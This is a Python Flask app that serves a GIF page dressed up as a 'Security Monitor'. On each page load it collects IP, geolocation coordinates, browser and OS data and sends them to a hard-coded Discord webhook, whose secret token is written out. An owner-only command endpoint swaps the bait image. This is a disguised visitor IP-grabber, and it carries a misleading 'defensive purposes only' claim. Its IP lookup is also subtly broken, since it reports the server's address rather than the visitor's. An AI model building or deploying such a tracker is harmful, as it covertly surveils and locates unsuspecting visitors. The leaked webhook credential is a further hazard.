from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
from datetime import datetime
import re

app = Flask(__name__)

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1527150420537905292/kayD-ghBN6shDNhFJNPOuncX9myoTGpqAMnMMEZqGSoMchA47oTvViwJiBbBQUpJBxjQ"
OWNER_ID = "1477672979272831089"

# Default GIF URL
DEFAULT_MEDIA_URL = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNW8xa2p0bjZzenluNDlqN3dmaDd0MTcwcWwyeGoydWpoNjQyZWY3ZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0IyeheChYxx2byDu/giphy.gif"

# Store current media URL (can be changed via commands)
current_media_url = DEFAULT_MEDIA_URL
media_type = "gif"  # or "img"

# HTML Template with better design
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1a3e 50%, #0a0e27 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }
        
        .media-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .media-container img,
        .media-container video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 0, 0.1);
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        
        .status-text {
            color: #00ff00;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 1px;
        }
        
        .media-info {
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
            font-family: monospace;
        }
        
        .glow-effect {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 0, 0.03) 0%, transparent 70%);
            pointer-events: none;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="media-container">
            <div class="glow-effect"></div>
            {% if media_type == 'gif' %}
                <img src="{{ media_url }}" alt="Security Monitor">
            {% else %}
                <img src="{{ media_url }}" alt="Security Monitor">
            {% endif %}
        </div>
        
        <div class="status-bar">
            <div class="status-indicator">
                <div class="status-dot"></div>
                <span class="status-text">Security Monitoring Active</span>
            </div>
            <div class="media-info">
                {% if media_type == 'gif' %}
                    GIF • {{ media_url[:30] }}...
                {% else %}
                    Image • {{ media_url[:30] }}...
                {% endif %}
            </div>
        </div>
    </div>
</body>
</html>
"""

def get_public_ip():
    """Get visitor's public IP address"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return "Unable to retrieve"

def get_geo_location(ip):
    """Get approximate geolocation data"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,timezone', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return {
                'country': data.get('country', 'N/A'),
                'city': data.get('city', 'N/A'),
                'latitude': data.get('lat', 'N/A'),
                'longitude': data.get('lon', 'N/A'),
                'timezone': data.get('timezone', 'N/A')
            }
        return None
    except:
        return None

def get_browser_info(user_agent):
    """Extract browser and system information"""
    browser_info = {
        'browser': 'Unknown',
        'os': 'Unknown'
    }
    
    if user_agent:
        # Browser detection
        if 'Chrome' in user_agent and 'Edg' not in user_agent:
            browser_info['browser'] = 'Chrome'
        elif 'Firefox' in user_agent:
            browser_info['browser'] = 'Firefox'
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            browser_info['browser'] = 'Safari'
        elif 'Edg' in user_agent:
            browser_info['browser'] = 'Edge'
        elif 'Opera' in user_agent:
            browser_info['browser'] = 'Opera'
        
        # OS detection
        if 'Windows' in user_agent:
            browser_info['os'] = 'Windows'
        elif 'Mac' in user_agent:
            browser_info['os'] = 'macOS'
        elif 'Linux' in user_agent:
            browser_info['os'] = 'Linux'
        elif 'Android' in user_agent:
            browser_info['os'] = 'Android'
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            browser_info['os'] = 'iOS'
    
    return browser_info

def send_discord_embed(visitor_data):
    """Send formatted embed to Discord channel"""
    embed = {
        "title": "Security Alert - Visitor Detected",
        "color": 0x00ff00,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {
                "name": "Public IP",
                "value": visitor_data.get('ip', 'N/A'),
                "inline": True
            },
            {
                "name": "Country",
                "value": visitor_data.get('country', 'N/A'),
                "inline": True
            },
            {
                "name": "City",
                "value": visitor_data.get('city', 'N/A'),
                "inline": True
            },
            {
                "name": "Coordinates",
                "value": f"Lat: {visitor_data.get('latitude', 'N/A')}\nLon: {visitor_data.get('longitude', 'N/A')}",
                "inline": True
            },
            {
                "name": "Timezone",
                "value": visitor_data.get('timezone', 'N/A'),
                "inline": True
            },
            {
                "name": "Browser",
                "value": visitor_data.get('browser', 'N/A'),
                "inline": True
            },
            {
                "name": "Operating System",
                "value": visitor_data.get('os', 'N/A'),
                "inline": True
            },
            {
                "name": "User Agent",
                "value": visitor_data.get('user_agent', 'N/A')[:100] + "...",
                "inline": False
            },
            {
                "name": "Visit Time",
                "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
                "inline": False
            }
        ],
        "footer": {
            "text": "Security Monitoring System - Data collected for defensive purposes only"
        }
    }
    
    data = {
        "embeds": [embed],
        "content": "New Visitor Detected - Security Log"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

def send_discord_command_response(message, success=True):
    """Send command response to Discord"""
    embed = {
        "title": "Command Executed" if success else "Command Failed",
        "color": 0x00ff00 if success else 0xff0000,
        "description": message,
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {
        "embeds": [embed],
        "content": "Command Response"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

@app.route('/')
def index():
    global current_media_url, media_type
    
    # Get visitor information
    visitor_ip = request.remote_addr
    
    # If behind proxy, get real IP
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    # Get public IP (in case of NAT)
    public_ip = get_public_ip()
    
    # Get geolocation
    geo_data = get_geo_location(public_ip)
    
    # Get browser info
    user_agent = request.headers.get('User-Agent', '')
    browser_info = get_browser_info(user_agent)
    
    # Prepare visitor data
    visitor_data = {
        'ip': public_ip,
        'country': geo_data.get('country', 'N/A') if geo_data else 'N/A',
        'city': geo_data.get('city', 'N/A') if geo_data else 'N/A',
        'latitude': geo_data.get('latitude', 'N/A') if geo_data else 'N/A',
        'longitude': geo_data.get('longitude', 'N/A') if geo_data else 'N/A',
        'timezone': geo_data.get('timezone', 'N/A') if geo_data else 'N/A',
        'browser': browser_info['browser'],
        'os': browser_info['os'],
        'user_agent': user_agent,
        'visit_time': datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }
    
    # Send to Discord
    send_discord_embed(visitor_data)
    
    # Return the HTML page with current media
    return render_template_string(
        HTML_TEMPLATE,
        media_url=current_media_url,
        media_type=media_type
    )

@app.route('/command', methods=['POST'])
def handle_command():
    """Handle Discord commands from owner"""
    global current_media_url, media_type
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid request"}), 400
        
        # Verify owner ID
        user_id = data.get('user_id')
        if user_id != OWNER_ID:
            send_discord_command_response("Unauthorized: You are not the owner", False)
            return jsonify({"error": "Unauthorized"}), 403
        
        command = data.get('command', '').strip()
        
        # Parse command
        if command.startswith('/gif '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "gif"
                send_discord_command_response(f"GIF updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "gif"}), 200
            else:
                send_discord_command_response("Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
                
        elif command.startswith('/img '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "img"
                send_discord_command_response(f"Image updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "img"}), 200
            else:
                send_discord_command_response("Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
        
        elif command == '/reset':
            current_media_url = DEFAULT_MEDIA_URL
            media_type = "gif"
            send_discord_command_response("Media reset to default GIF", True)
            return jsonify({"success": True, "media_url": DEFAULT_MEDIA_URL, "type": "gif"}), 200
        
        elif command == '/status':
            send_discord_command_response(f"Current media: {media_type}\nURL: {current_media_url}", True)
            return jsonify({"success": True, "media_url": current_media_url, "type": media_type}), 200
        
        else:
            send_discord_command_response("Unknown command. Available: /gif <url>, /img <url>, /reset, /status", False)
            return jsonify({"error": "Unknown command"}), 400
            
    except Exception as e:
        send_discord_command_response(f"Error: {str(e)}", False)
        return jsonify({"error": str(e)}), 500

def is_valid_url(url):
    """Validate URL format"""
    url_pattern = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(url_pattern, url) is not None

@app.route('/api/status')
def get_status():
    """Get current media status (for debugging)"""
    return jsonify({
        "media_url": current_media_url,
        "media_type": media_type,
        "default_url": DEFAULT_MEDIA_URL
    })
